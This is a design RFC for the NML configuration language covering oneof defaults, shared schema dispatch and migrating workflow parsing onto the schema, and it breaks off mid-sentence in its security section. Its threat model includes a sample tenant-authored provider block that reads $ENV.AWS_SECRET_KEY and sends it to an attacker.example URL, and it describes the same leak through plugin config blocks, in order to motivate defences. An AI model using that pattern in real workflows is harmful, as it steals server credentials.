# RFC 0002 — Shared Body-Aware Dispatch, `oneof` Defaults, and Workflow-Subsystem Migration

> Supersedes RFC 0001's "Phase 5 visitor unification": §4 revises that to a small shared
> dispatch extraction rather than a full validator rewrite.

- **Status:** Implemented. (The one item deferred from scope — LSP variant-field completion,
  §7b — was promoted to and **completed in [RFC 0003](./0003-schema-driven-field-completion.md)**
  as part of general schema-driven field completion.)
- **Builds on:** [RFC 0001 — Schema-Driven Defaulting](./0001-schema-driven-defaulting.md) (complete)
- **Crates touched:** `nml-core`, `nml-validate`, `nml-lsp`, downstream consumers (`nudge`)
- **Supersedes TODO items:** "oneof: enum-typed discriminator", "oneof: variant-aware LSP completion", and the deferred Phase 5 of RFC 0001

## 1. Summary

RFC 0001 landed schema-driven defaulting and a shared `SchemaIndex` + `resolve_ref`
dispatch, but deliberately left two things for a follow-on, and an audit surfaced a
third:

1. **One piece of dispatch is still duplicated.** Validation and defaulting share most
   dispatch (`resolve_ref`) but the **body-dependent union/list variant selection** —
   which inspects the instance body, so a field-only `resolve_*` cannot express it — is
   still inline in the validator only. This RFC extracts it into a shared **body-aware
   dispatch** (`resolve_type_in_body`), used by both walks. (This *revises* RFC 0001
   §6.2's full-visitor sketch — see §4 for why a shared dispatch beats a visitor here.)
2. **`oneof` defaults are absent.** A `oneof` cannot declare a default discriminator,
   and union-typed fields are never defaulted. This RFC adds both — unblocked by the
   shared body-aware dispatch (a union default needs to resolve the variant from the
   body).
3. **The workflow subsystem bypasses the schema entirely.** Workflow `.nml` files are
   parsed by a 2,190-line hand-written parser ([`workflow/parser.rs`]) with
   hand-rolled defaults, while `workflow.model.nml` — the supposed schema — is unused,
   unenforced, and currently does not even parse (a `provider?` field with no type).
   This is exactly the dual-source-of-truth drift RFC 0001 exists to eliminate. This
   RFC migrates the workflow subsystem onto the schema system, reusing RFC 0001's
   defaulting and this RFC's validation.

Parts A (shared dispatch + `oneof` defaults) and B (workflow migration) are independent
and separately shippable; B *consumes* the infrastructure from RFC 0001 (defaulting,
`SchemaIndex`) and this RFC's schema enforcement, but does not depend on union
defaulting.

## 2. Motivation

- **DRY / single definition of dispatch.** The last hand-synced piece of dispatch (the
  body-dependent union/list selection) is the same hazard RFC 0001 removed for the rest.
  A shared body-aware dispatch closes it without the risk of a full validator rewrite.
- **Capability.** Discriminator defaults and union defaulting are real ergonomic wins
  (a `email` block that defaults `provider = "log"`; a union field that synthesizes its
  default variant).
- **Eliminate the workflow drift.** An unenforced schema that silently broke is the
  worst case: it lies about the format. Either it becomes the enforced source of truth,
  or it should not exist. This RFC makes it the former.
- **Spec.** The `oneof` constructs should meet the discriminated-union semantics the
  spec/most-typed-config-languages provide (default variant, enum-typed tag).

# Part A — Shared body-aware dispatch + `oneof` defaults

## 3. Current state (Part A)

- **Dispatch is shared, the walk is not.** [`SchemaIndex::resolve_ref`] /
  `resolve_field` are the one name→target / field→target definition (RFC 0001). But
  the validator walks in `validate_instance_against_model` ([`schema.rs`]) and the
  defaulter walks in `Defaulter::model_body` ([`defaults.rs`]) — two traversals.
- **The union/list dispatch is body-dependent.** The validator inspects the instance
  body (`has_list_items`) to choose between a `ModelRef` variant and a `List` variant.
  A pure `resolve_*(field)` cannot express this — it is the one piece of dispatch that
  genuinely needs the body, and the reason unification waited. `FieldTarget::Union` is
  opaque (no variants), and `resolve_field(field)` returns it for union fields; the
  validator's union handling therefore stays inline (`FieldType::Union(variants)` +
  body inspection).
- **`oneof` has no default.** [`OneOfDecl`] / [`OneOfDef`] carry `discriminator` +
  `arms`/`variants` only. `Defaulter::oneof_body` no-ops when the discriminator is
  absent; union-typed fields pass through untouched (RFC 0001 §8).

## 4. Shared body-aware dispatch (not a full visitor)

RFC 0001 §6.2 sketched a single schema-guided **visitor** that both validation and
defaulting would implement. Having since *implemented* the defaulter, this RFC
**revises that decision**: validation is a fold (`Body → Vec<Diagnostic>`) and
defaulting is a transform (`Body → Body`) — genuinely different recursion schemes. A
visitor trait that serves both couples a fold and a tree-rewrite, and forces a rewrite
of the ~2,900-line validator (the highest-blast-radius change). The cost is not
justified by the benefit, because **the only duplication union defaulting actually
forces is the body-dependent union/list variant selection** — ~40 lines in the
validator ([`schema.rs`] `FieldType::Union` arm) that inspect the instance body
(`has_list_items`) to choose between a `ModelRef` variant and a `List` variant.

So the unification is precise, not wholesale: extract that one body-dependent rule into
a shared dispatch on `SchemaIndex`, used by **both** existing walks. The two walks stay
(they are different by nature); they share *all* dispatch — `resolve_ref` (RFC 0001)
plus this new body-aware step — so neither re-derives any selection logic.

```rust
// nml-core
/// A type's target once the instance body is known — the only dispatch that needs
/// the body. For a non-union type this is exactly `resolve_type`/`resolve_field`. For
/// a union it applies the `has_list_items` rule, picks the variant, and returns *that
/// variant's resolved target* (Model / OneOf / Leaf / ListOf) — never `Union`. Takes a
/// `FieldType` (not a `FieldDef`) because the call sites have the list's *inner type*.
/// Shared by the validator's walk and the defaulter's walk.
pub fn resolve_type_in_body<'a>(&'a self, ty: &FieldType, body: &Body) -> FieldTarget<'a>;
```

- **`FieldTarget` is unchanged** — `resolve_type_in_body` *resolves* the union
  internally and hands back a concrete target, so the returned `FieldTarget` borrows
  only from the index (never from the field), preserving the clean lifetime story RFC
  0001 established. (An earlier draft enriched `FieldTarget::Union` with `&[FieldType]`;
  that entangles the target's lifetime with the field and gains nothing, since both
  consumers want the *resolved* variant, not the variant list.)
- **The depth guard and bounds stay shared by constant** (`MAX_DEFAULT_DEPTH` /
  `MAX_VALIDATION_DEPTH`, already aligned), not by a shared walk object.
- **Behavior-preserving for validation** — the validator's body-dependent union arm is
  replaced by a call to the shared function with identical semantics; the existing
  100+ validator tests are the regression guard.

This is strictly lower-risk than a validator rewrite and removes the duplication that
actually matters. (A full visitor remains a possible future refactor if a *third*
walk ever appears, but two walks sharing complete dispatch is the cleaner end-state for
two consumers.)

## 5. `oneof` discriminator default

Once the defaulter can resolve into a `oneof`/union (via `resolve_type_in_body`), a
`oneof` may declare a default arm:

```
oneof email by provider = "log":
    "log"      => emailLog
    "postmark" => emailPostmark
```

> **Historical syntax note:** the arm arrow shown here (`=>`) was the syntax at the
> time of this RFC; [RFC 0006](./0006-thin-arrow.md) later replaced it with `->`.
> Do not copy `=>` from this example — the parser now rejects it with guidance.

- **Syntax:** `= <value>` after the `by <discriminator>` clause deliberately mirrors
  field-default syntax (`name type = default`), so the language has one "= default"
  convention rather than a bespoke marker. It composes with the §7 enum-typed
  discriminator: `oneof email by provider: emailProviderKind = "log"` (type annotation
  then default), parsed left-to-right with no ambiguity.
- **AST/model:** add `default_discriminator: Option<SpannedValue>` to [`OneOfDecl`] and
  `Option<String>` to [`OneOfDef`].
- **Parser:** accept the `= <value>` clause; the value must be one of the arm keys
  (validated at schema load).
- **Defaulting:** in the `oneof` walk, when the discriminator property is absent and a
  default exists, inject it *before* serde sees it, then default the selected variant
  (the existing injection path once the tag is present — RFC 0001 §8).
- **Validation:** at schema load, the default must match an arm key; a `oneof` with a
  default whose value names no arm is an error (reuses the arm-key set already built by
  `find_oneof_errors`). **Instance validation honors the default too:** an instance that
  omits the discriminator is validated against the *default variant* (not reported as a
  missing discriminator), so validation agrees with defaulting — the validator runs on
  the raw file before defaults are injected, so it must apply the same default rule.

## 6. Union defaulting

With `resolve_type_in_body` exposing the selected variant target, the defaulter can
default union-typed list items: resolve the variant (by the body-dependent rule), then
default that variant's fields via the existing `model_body`/`oneof_body` paths. This is
the capability RFC 0001 §8 explicitly deferred ("guessing a variant would be wrong"
without a resolved target). The materialization budget and depth bound from RFC 0001
§8.1 carry over unchanged — union defaulting respects the same DoS bounds.

No new recursion scheme is introduced: `recurse_nested` handles a list field by its
inner *type* (`list_body`), which selects each item's variant via `resolve_type_in_body`
and dispatches the resolved target through `default_against` — the defaulter's analogue
of the validator's `validate_target_instance`, sharing the same dispatch primitive.

## 7. Adjacent `oneof` enhancements (fold in)

- **Enum-typed discriminator. DONE.** `oneof email by provider as providerKind` (the
  RFC's earlier `by provider: …` sketch collided with the body colon; the contextual
  keyword `as` — mirroring `by`/`is` — is unambiguous). `discriminator_type` on
  `OneOfDecl`/`OneOfDef`; the parser accepts `as <enum>` before the optional `= default`
  and the `:`; `find_oneof_errors` requires the type to be a declared enum and the arm
  keys to **exactly** cover its variants (missing-variant and extra-arm both reported,
  in source order); `nml-fmt` round-trips it. 6 tests.
- **Variant-aware LSP completion** ([`nml-lsp`]).
  - **(a) Discriminator-value completion — DONE.** At `<discriminator> = …` inside a
    `oneof` block, the arm keys are offered as completions
    (`find_oneof_discriminator_at`, mirroring `find_model_ref_type_at`). Like all the
    LSP's value completions it needs the document to parse, so it filters live as the
    user types (the empty-trigger case is a pre-existing limitation shared with
    model-ref completion — error-tolerant context detection would improve both and is
    a separate enhancement).
  - **(b) Variant-field completion — DONE in [RFC 0003](./0003-schema-driven-field-completion.md).**
    It was correctly identified as *model-field completion* applied to the resolved variant
    (not a oneof-only special case), so it landed with that general feature: RFC 0003's
    `find_model_body_at` resolves a `oneof` variant from the body's discriminator and offers
    its fields, alongside top-level/nested/list field completion.

# Part B — Workflow-subsystem migration

## 8. Current state (Part B)

- **Workflow files are parsed by a hand-written parser.** [`workflow/parser.rs`]
  (2,190 lines, ~18 `parse_*` functions) walks the raw AST and builds typed configs,
  applying **hand-rolled defaults** (`PromptConfig::default()`, `unwrap_or_default()`,
  `OutputFormat::default()`).
- **`workflow.model.nml` is unused, unenforced, and broken.** It is referenced only as
  a `const` and in `embedded_schemas::ALL`; no validator is built from it; nothing
  parses it; and it has a syntax error (`provider?` — a field named `provider` with no
  type). The correct type is **`provider string?`**, not `provider provider?`:
  `parse_step` extracts `step.provider` via `extract::<String>` into a `provider_ref:
  String`, so the field is a string naming a provider, not an inline `provider` model.
  Matching the schema to the parser's real behavior is the reconciliation principle for
  all of Part B (§10). Its breakage was invisible because `verify_bundled_schemas` only
  checked length.
- **The parser does things plain serde cannot:** symbol/const resolution
  (`resolve_string` against the `SymbolTable`, e.g. `model = defaultModel`), ACL
  modifier extraction (`|allow`/`|deny`/`|grant`), custom type conversions
  (`ProviderType::from_str`, `SecretString`), and rich control-flow parsing
  (routes/conditions/parallel/stages). A naive "replace with `from_block`" would
  **lose** symbol resolution — a capability regression, which RFC 0001's own rule
  forbids.

## 9. The enabler: const resolution in `ValueResolver`

Symbol/const resolution is the one capability the standard deserialize path lacks. It is
a *value* transform — `Value::Reference("defaultModel") → the const's value` — exactly the
kind `ValueResolver` already does for `$ENV.X`. Rather than add a *separate* pass, this
RFC **extends `ValueResolver` to resolve `Value::Reference` in its existing recursive
pass**. `ValueResolver::resolve` already recurses over `Fallback`/`Array` and currently
clones `Reference` (the `other` arm); the change adds a `Reference` arm that resolves the
const and **recurses on the result**:

```rust
// nml-core — ValueResolver gains an optional symbol lookup
impl ValueResolver {
    pub fn with_symbols(self, lookup: impl Fn(&str) -> Option<Value> + 'static) -> Self;
    // resolve(): Value::Reference(name) =>
    //   match symbol_lookup(name) {
    //     Some(v) => self.resolve(&v),   // const may itself hold $ENV or a further ref
    //     None    => value.clone(),      // unknown ref → literal name (parser parity)
    //   }
}
```

Why a single extended resolver, not a separate `SymbolResolver` ordered before env:

- **No ordering footgun.** A `const base = $ENV.B` makes a reference resolve to a
  `Secret($ENV.B)` that *must* then be env-resolved. Two ordered passes encode that
  dependency fragilely (wrong order ⇒ a const-wrapped `$ENV` silently stays
  unresolved). Resolving each node to fixpoint **in one recursive pass** removes the
  dependency — order is irrelevant because every node resolves fully where it sits.
- **DRY + scalable.** One traversal/clone of the body, one resolution concept, instead
  of two passes each cloning the whole body.
- **Backward-compatible.** With no symbol lookup configured, `Reference` still passes
  through unchanged (today's behavior). An unknown reference stays a `Reference`, which
  deserializes as its name string — exact parity with the parser's `resolve_string`
  (`resolve_const_value(name)` else `name.clone()`).
- **Cycle-safe.** Const reference cycles are rejected up front via the existing
  `SymbolTable::find_const_cycles`; the recursive resolve is therefore total.

The building blocks already exist in `nml-core`: `SymbolTable::resolve_const_value` and
`find_const_cycles`. The workflow load path builds `ValueResolver::without_env().with_symbols(…)`
— **const-only**, never `$ENV` (the security boundary established in §9.1); parity is pinned
against `resolve_string` before any block migrates.

The canonical workflow pipeline is then just RFC 0001's, unchanged in shape (the
resolver step resolves consts only for workflows — §9.1):

```
apply_shared_properties → apply_defaults → resolve (consts, one pass) → from_block
```

Resolution still runs last, so the schema-aware passes never see resolved material —
RFC 0001's least-secret-exposure property is preserved.

### 9.1 One resolver per file; const-only (no `$ENV`) for security

Two questions surfaced once the first block (`prompt`) migrated. They resolve together:
**the workflow load path builds exactly one `ValueResolver` per file and threads it, and
that resolver resolves consts only — deliberately *not* `$ENV` (a security boundary;
see below).**

**One resolver per file (not per block).** The migration's first cut built the resolver
inside each `parse_*` block (`workflow_value_resolver(symbols)` →
`resolved_const_snapshot()` per call). That re-snapshots the const map once per migrated
block — fine for one cold-path block, wasteful as more migrate. The clean architecture:
build the resolver **once** in `parse_workflow_file` (right after the `SymbolTable` is
populated) and thread `&ValueResolver` through `parse_step` / `parse_*`. Concretely:

- `parse_workflow_file` constructs `let resolver = ValueResolver::without_env().with_symbols(
  symbols.resolved_const_snapshot())` once (const-only — §9.1 security).
- The legacy `resolve_string(value, symbols)` is reimplemented as a thin wrapper over the
  resolver — `extract::<String>(resolver.resolve(value)?)` — so **all** control-value
  resolution (migrated `from_body_defaulted` blocks *and* not-yet-migrated hand-parsed
  blocks) flows through the one resolver. This collapses two resolution mechanisms into one.
- **The reroute is control-values only — `classify_config_value` stays on `ctx.symbols`.**
  This is the guardrail that prevents the recurring error of routing `config:` through the
  `without_env()` resolver: that resolver *denies* `$ENV` (errors), but `config:` must
  *defer* it (store `ConfigValue::Secret` for an operator, resolve at execution). So config
  and control share const-resolution *intent* but diverge precisely at the `$ENV` step
  (control: deny; config: defer) — they cannot share the same resolver instance. Config
  keeps resolving const references directly via `ctx.symbols.resolve_const_value` (§9.2,
  done), which defers `Value::Secret` by construction.
- As each block migrates to `from_body_defaulted(index, "<model>", body, &resolver)`, it
  uses the same threaded resolver; when the last block migrates, the hand-parser's bespoke
  `resolve_string` *wrapper for control values* disappears (B5).

**Thread a `ParseCtx`, not a second parameter.** Twelve `parse_*` functions already take
`&SymbolTable`; naively adding `&ValueResolver` beside it, then removing both at B5, is two
rounds of churn across ~18 signatures. Instead introduce one carrier:

```rust
struct ParseCtx<'a> {
    symbols: &'a SymbolTable,    // non-value lookups (agents/tools/provider decls, ACL)
    resolver: &'a ValueResolver, // all control-value resolution (const-only, §9.1)
    trust: WorkflowSource,       // load-time trust; gates `config:` $ENV (§9.2). Copy.
}
```

and thread `&ParseCtx` as the single context argument. This is the DRY, scalable
end-state — the `resolver` handles control values, `symbols` resolves `config:` const
references (which defer `$ENV` and so cannot use the deny-resolver) plus any
declaration/ACL lookups, and `trust` gates the `config:` `$ENV`. The next context addition
is free rather than another 18-signature edit. **`symbols` does *not* disappear at B5:**
`config:` classification permanently needs const resolution that defers secrets — a
behavior neither the deny-resolver (control) nor a hypothetical env-resolver provides — so
`ParseCtx` retains `symbols` even once the `resolve_string` control wrapper is gone. (A
fully-unified engine would require `ValueResolver` to grow an explicit secret *policy*
—resolve / deny / defer — replacing today's `Option<VarLookup>`; that is a plausible future
cleanup but, given config still classifies the resolved value and would need its own
`Defer`-policy resolver instance, it is not obviously cleaner than the small, explicit
`classify_config_value`. Deferred, not adopted.)

This is the cleanest end-state: one resolution concept, built once, threaded once, used
everywhere — not a resolver per block, not two parallel resolution paths, and not a growing
parameter list.

**Pre-flight parity assertion (pin before the reroute).** Rerouting `resolve_string` through
`without_env()` flips any *control* value containing `$ENV` from "stored as a useless
literal" to a fail-fast `EnvDisabled` error. That is the intended improvement, but it must
not silently break a shipped workflow: before the reroute lands, a test asserts that no
example workflow uses `$ENV` in a control value (`provider`/`prompt`/`route`/`entrypoint`/…)
— only in plugin `config:` blocks, which resolve on the separate plugin-host path (§9.1).
Today that invariant holds; the test freezes it so the reroute is provably behavior-
preserving for every real workflow.

**Surface the `EnvDisabled` reason at the workflow layer.** `nml-core`'s `EnvDisabled`
message is correct but deliberately generic ("environment variables are not available in
this context"). The *actionable* guidance — e.g. "omit `apiKey` to use the server's
configured provider credentials" — depends on workflow context `nml-core` must not know, so
the workflow load path maps `EnvDisabled` to a workflow-specific diagnostic. Encapsulation is
preserved (the generic error stays generic); ergonomics land where the context exists.

**Workflow values resolve consts only — never `$ENV` (security).** This is the one
place where workflows must diverge from server config. A workflow can be
**tenant-authored** (RFC §13), and a `provider` block lets the author set both `apiKey`
and `baseUrl`. If workflow values resolved `$ENV` at deserialize, a workflow could
exfiltrate a server secret:

```
provider Evil:
    apiKey = $ENV.AWS_SECRET_KEY        # read the server's environment …
    baseUrl = "https://attacker.example" # … and ship it to an attacker endpoint
```

— or leak it into a prompt (`system = $ENV.SECRET`), which lands in the outbound LLM
request and logs. So the workflow resolver is **const-only**, expressed as a first-class
mode: `ValueResolver::without_env().with_symbols(snapshot)`. `without_env()` sets the env
lookup to `None`, so a `$ENV` reference never reaches the process environment and instead
fails with a clear, dedicated `ResolveError::EnvDisabled` ("environment variables are not
available in this context") — *not* the misleading "variable not set" (which would imply
setting it could help). Consts (workflow-internal references) still resolve; the server
environment is simply off-limits, by construction and self-documented at the call site.

This is *not* a capability loss, because server LLM credentials already reach workflows
through the correct, narrow channel: when a provider **omits** `apiKey`, the LLM client's
`resolve_key` reads a **fixed, provider-determined** env var (`GROQ_API_KEY`,
`ANTHROPIC_API_KEY`, …) fresh per request via `std::env::var` — operator-controlled, a
name the workflow author cannot choose or redirect, transient, never stored. That path is
unchanged. The legacy `resolve_string` happened to be safe here only by accident (it
stored `$ENV.X` as a useless literal); the `without_env()` resolver makes the safety
explicit, fail-fast, and clearly diagnosed.

Two practical confirmations from the example corpus: **every** shipped `provider` block
already omits `apiKey` (only `model = "…"`), so const-only-for-control is the *existing*
pattern, not a new restriction; and **every** `$ENV` in every example lives in a `config:`
block, so the `resolve_string` reroute is provably behavior-preserving (the pre-flight
parity test freezes this). The one scenario const-only does not serve is an operator who
wants *distinct* keys for two providers of the same kind via custom env-var names
(`$ENV.GROQ_KEY_A` / `$ENV.GROQ_KEY_B`) — the fixed-name fallback yields one key per
provider kind. No example needs this; if it ever arises, the right fix is to extend
`resolve_key`'s name resolution (request-time, latest-possible), **not** to open provider
`$ENV`, which would resolve the secret at *load* time and regress least-secret-exposure.

### 9.2 The exfiltration surface is `$ENV`-reaches-author-sink, not "the provider block"

The const-only resolver above closes `$ENV` for *control values* (the `resolve_string`
path). But that is **not the whole secret-bearing surface**, and the boundary must be drawn
on the right axis or it gives a false guarantee. The real invariant is:

> No author-controlled value may both **resolve a server `$ENV`** and **reach an
> author-controlled sink** (an attacker URL, a prompt, logs).

The provider block satisfies both (`apiKey` + `baseUrl`). But so do plugin **`config:`
blocks** — and they take a *different* resolution path the const-only resolver never
touches. [`parse_config_block`] stores `$ENV.X` as `ConfigValue::Secret("$ENV.X")`
(deferred), and the value is resolved against the **real server environment at the
plugin-host layer** when the plugin boots. Every `$ENV` in the shipped examples lives here,
not in a provider block — e.g. `voice-agent.workflow.nml`:

```
stage DeepgramSTT:
    config:
        apiKey = $ENV.DEEPGRAM_API_KEY        # resolved at the plugin host

tool DialViaTelnyx:
    config:
        apiKey   = $ENV.TELNYX_API_KEY
        streamUrl = $ENV.NUDGE_STREAM_URL     # author-controlled sink
```

So the exact exfiltration §9.1 closes for `provider` is **wide open** through `config:`: a
tenant writes `apiKey = $ENV.AWS_SECRET_KEY` + a configurable URL pointing at an attacker
and the plugin host ships it. The fix is to enforce the one invariant across **both**
surfaces — const-only control values (always) plus a single trust gate on `config:` `$ENV` —
not to special-case the provider block:

- **The trust level is a property of the workflow's *source*, not the block kind.** A
  workflow loaded from an operator-controlled path is **trusted**; one ingested from a
  tenant is **untrusted**. This decision is made once, at load, and is the single axis that
  governs `$ENV` resolution everywhere in the file.
- **Trust is explicit and fails closed.** The load API takes the trust level as a required
  argument (e.g. `WorkflowSource::{Operator, Tenant}`) — never inferred heuristically and
  never defaulted to trusted. A caller that forgets to classify gets the **untrusted**
  behavior (no `$ENV`), so a future ingestion path added without thinking about trust is
  safe by construction; opening `$ENV` requires a deliberate `Operator` declaration at the
  call site. (The existing operator-sourced load sites pass `Operator` explicitly; the type
  has no `Default`.)
- **The two paths are asymmetric by design, and that asymmetry is correct.** Control
  values are **const-only regardless of trust** — `$ENV` is *never* legitimate there,
  because the narrow `resolve_key` fallback already supplies server LLM credentials by
  fixed name (§9.1). Plugin `config:` values are different: there is **no** equivalent
  fixed-name fallback for arbitrary plugin credentials, so `$ENV` *is* the legitimate
  operator channel for them (`DEEPGRAM_API_KEY`, …). The trust flag therefore gates only
  the `config:` path; the control path needs no flag.
- **Trusted load:** `config:` `$ENV` resolves exactly as today — **deferred** to execution
  (`ToolExecutor::resolve_config`, [`tool_executor.rs`]) so the resolved secret lives for
  the shortest possible time (RFC 0001 §5 least-secret-exposure), unchanged. Control values
  stay const-only.
- **Untrusted load:** the gate is applied **once, at load** — `parse_config_block` rejects
  any value that classifies as a secret (`ConfigValue::Secret`, i.e. a `$ENV` reference,
  whether written inline or reached through a const) with the same `EnvDisabled` diagnostic
  as control values. Because the rejection happens at parse, **an untrusted workflow's
  parsed model contains no config secret at all** — so the execution-time `resolve_config`
  is reached only with already-trusted secrets and needs no trust flag of its own. One gate,
  fail-fast, no trust threading into the execution layer. Tenant credentials, when
  legitimately needed, are injected out-of-band by the operator, never named by `$ENV` in
  tenant text.

This makes the security model **consistent and complete**: one trust decision, one
invariant, one gate. The current RFC body (pre-9.2) protected only the provider block,
which is the smaller hole; §9.2 closes the larger `config:` hole with the same
`EnvDisabled` mechanism — at load, not at execution.

**Implementation note.** This is a small *threading* change, not new machinery: the
`WorkflowSource` trust level reaches `parse_config_block` via the `ParseCtx` (§9.1), which
already carries the const snapshot it needs to classify a const-reaching-`$ENV` as a secret.
The execution path (`resolve_config`) is **deliberately left unchanged** — it keeps
`ValueResolver::env()` because, by the load-time gate above, it only ever sees secrets that
were already trusted. (Two corrections over an earlier draft of this section: config `$ENV`
must stay *enabled* for trusted workflows — routing it through the const-only control
resolver would break legitimate plugin credentials — and the denial belongs at load, not at
the plugin-host boundary.)

**Ordering in `resolve_config_with_args` is load-bearing.** The args-merge path resolves
`$ENV` **first** (`resolve_config`) and only then substitutes LLM-provided `{{args.X}}` as
**plain strings** that are never re-resolved. So a model that emits `"$ENV.SECRET"` as an
argument yields the literal string, never an environment read — model/tenant-influenced args
cannot reintroduce the exfiltration. This ordering (resolve env → substitute args, args
inert) is a security invariant and must be preserved; a regression that merged args before
resolution, or re-ran the resolver over merged values, would reopen the hole. Pin it with a
test.

## 10. Migration strategy (incremental, capability-preserving)

A full rip-and-replace is neither safe nor warranted — the parser's control-flow and
ACL logic is genuinely custom. The migration is **layered**, each layer shippable:

- **B1 — Fix + enforce the schema (no parser change).** Repair `workflow.model.nml`
  (`provider string?` — matching `parse_step`'s `String` extraction, §8 — and audit
  every field against the parser's accepted keys), build a `WORKFLOW_VALIDATOR`, and
  validate workflow files at load. Immediate value: the schema becomes enforced and can
  no longer drift; malformed workflows get clear diagnostics. Add the same "embedded
  schema parses / is well-typed" guard RFC 0001 added for the other schemas (which would
  have caught the `provider?` bug). **Status: DONE** (see §14 B1) — syntax fix,
  parse-every-schema guard, well-typed-defaults check, `WORKFLOW_VALIDATOR` wiring, field
  reconciliation, load-time enforcement, and duplicate-declaration enforcement all landed.
- **B2 — Const resolution in `ValueResolver` (§9).** Add the optional symbol lookup +
  `Reference` arm in `nml-core` with tests; no consumer change yet.
- **B3 — Migrate serde-able leaf blocks to schema deserialize + defaulting.** Blocks
  whose parsing is field extraction + defaults (`provider`, `prompt`, `stage`,
  `pipeline`, `condition`, `route`) move to `from_body_defaulted` using the **one
  per-file `ValueResolver`** of §9.1 (**const-only** — never `$ENV`; §9.1/§9.2), and their
  hand-rolled Rust defaults are removed in favor of NML schema defaults — making the
  workflow schema the single source of truth for those. Typed fields (the `ProviderType`
  enum, `SecretString`) use standard serde custom-deserialize
  (`#[serde(deserialize_with)]` / a `Deserialize` impl) — not novel machinery, but not
  "plain" extraction either. Drift-guarded exactly like RFC 0001 §13. *Sequencing:* the
  first migrated block (`prompt`, no `$ENV`/secrets) built the resolver per-call as a
  deliberate interim step; before migrating `provider` (which has `$ENV`/`SecretString`),
  land §9.1 — hoist the resolver to one-per-file (as a `ParseCtx`, §9.1), reroute
  `resolve_string` through it, so `provider`'s `$ENV` fails fast and consistently from day
  one rather than being retrofitted. **`provider` acceptance items:** (1)
  `workflow.model.nml`'s `provider.apiKey` is `string?` (optional) and the Rust field is
  `Option<SecretString>`, so an *omitted* key cleanly triggers the narrow `resolve_key`
  request-time fallback (§9.1) rather than a parse error; (2) a `provider` with
  `apiKey = $ENV.X` fails with `EnvDisabled` (the resolve step runs before serde), pinned
  by a test.
- **B4 — Keep custom logic where it earns its place.** ACL modifier extraction,
  `agents`/`tools` reference wiring, and control-flow assembly
  (steps/routes/parallel) stay hand-written, but consume schema-validated,
  schema-defaulted sub-configs. The parser shrinks to orchestration over typed pieces.
  **Fix the `config:` const-resolution gap here (trust-independent).** [`parse_config_block`]
  today handles only `Secret`/`String`/`Number`/`Bool` and falls through to
  `other => ConfigValue::Plain(format!("{:?}", other))`, so a const reference
  (`config: apiKey = myKeyConst`) is stored as the debug string `Reference("myKeyConst")`
  rather than the resolved value — a silent capability gap, not a documented restriction.
  Fix: resolve a `Value::Reference` one level through the `ParseCtx` const snapshot (§9.1)
  to its const *value*, then classify that value with the existing rule — a `$ENV` secret
  becomes `ConfigValue::Secret` (deferred, exactly like an inline `$ENV`), anything else
  `ConfigValue::Plain`. The lossy `{:?}` fallback is removed. **Note this is *not* routing
  `config:` through the const-only control resolver** — that would `EnvDisabled`-reject a
  const that legitimately wraps `$ENV` for a trusted plugin credential (§9.2); config keeps
  `$ENV` deferred-and-enabled for trusted, gated only by the load-time trust check. The
  const-reference resolution (this item) and the `$ENV` trust gate (§9.2) are independent.
- **B4 — remove the silent-empty-string footgun in `resolve_config`.** Legacy per RFC 0001's
  rule: [`tool_executor.rs`] `resolve_config` today logs `"variable not resolved, using
  empty string"` and injects `""` when a trusted `config:` `$ENV` fails to resolve — the
  same misleading "carry on with a useless value" behavior that `EnvDisabled` replaced for
  control values (a plugin handed an empty `apiKey` fails opaquely downstream instead of at
  the source). Replace it with a hard, source-naming error so a missing operator credential
  fails loud at the boundary, consistent with the control-value path.
- **B5 — Decommission divergence.** Once a block is schema-driven, its bespoke default
  constants and field-by-field match arms are removed (legacy per RFC 0001's rule: the
  schema path now has equal-or-greater capability). B1 already made several hand-parser
  required-field checks (e.g. `stage` requires `wasm`) redundant — schema enforcement
  reports them first, so those manual checks are dead and slated for removal here.

If, after B1–B2, a block's parsing turns out to be *entirely* symbol-resolve +
extract + default, it migrates fully (B3) and its `parse_*` fn is deleted. Blocks that
can't (control flow) stay at B4. The end state: one enforced schema, schema-owned
defaults, and hand-written code only where it adds capability serde cannot.

## 11. Legacy removal

- `workflow.model.nml`'s `provider?` syntax error — fixed to `provider string?` (B1,
  done), not worked around.
- Per-block hand-rolled default constants/`Default` impls in the workflow types — removed
  as each block migrates (B5), guarded by the drift test.
- If B1 reveals fields in `workflow.model.nml` that the parser never accepted (pure
  documentation drift), they are reconciled to the parser's real behavior, then frozen
  by enforcement.
- `verify_bundled_schemas` is strengthened to **parse** every embedded schema (not just
  length-check), so a future `provider?`-class breakage fails the build.

## 12. Encapsulation & crate boundaries

- `resolve_type_in_body` and the `ValueResolver` const-resolution extension live in
  `nml-core` (pure schema/AST mechanics), consistent with RFC 0001 keeping
  deserialization in `nml-core` and validation policy in `nml-validate`. (`FieldTarget`
  is unchanged — §4.)
- The validator and defaulter keep their own walks but both call
  `resolve_type_in_body` for variant selection — neither re-derives dispatch. No
  visitor framework is introduced (§4).
- `nml-lsp` consumes `SchemaIndex` read-only for completion (no new ownership).
- `nudge` gains a `WORKFLOW_VALIDATOR` beside the existing embedded validators and
  builds a const-only `ValueResolver::without_env().with_symbols(…)` (§9.1) in the workflow
  load path, threaded as a `ParseCtx` (§9.1).

## 13. Security considerations

- **DoS bounds carry over.** Union defaulting inherits RFC 0001 §8.1: memoized
  defaultability, the materialization budget, and the depth guard. Union recursion goes
  through the same `Defaulter` budget/depth checks as any other nested model.
- **Const resolution is bounded.** Reference *cycles* (`const a = b`, `const b = a`)
  are rejected via `find_const_cycles`, so the recursive resolve is total. Unknown
  references resolve to the literal name (parity with the current parser, §9) — not an
  error, but bounded and non-recursive, so not a DoS or injection vector.
- **Least secret exposure preserved.** Symbol/`$ENV` resolution still runs last; the
  schema-aware passes never handle resolved secrets (RFC 0001 §5).
- **Workflow files are tenant-authored in some deployments** — enforcing the schema
  (B1) is a security *gain*: malformed/oversized workflows are rejected with bounded
  diagnostics instead of reaching the hand-parser's looser paths.
- **Workflow control values never read the server environment (§9.1).** Workflow
  deserialization uses a **const-only** resolver — `$ENV` is not resolved — because a
  provider lets the author set `apiKey` *and* `baseUrl`, so resolving `$ENV` would let a
  tenant-authored workflow exfiltrate a server secret to an attacker endpoint (or into a
  prompt/logs). Server LLM credentials reach workflows only via the operator-controlled,
  fixed-name request-time env fallback in the LLM client, which the author cannot redirect.
  (An earlier draft of §9.1 had this backwards; the const-only resolver is the corrected,
  secure design, pinned by `workflow_value_does_not_resolve_env_secret`.)
- **The same boundary covers plugin `config:` blocks (§9.2).** Control values are not the
  only secret-bearing surface: plugin/stage/tool `config:` blocks resolve `$ENV` against
  the real server environment on a *separate* path (the plugin host materializing
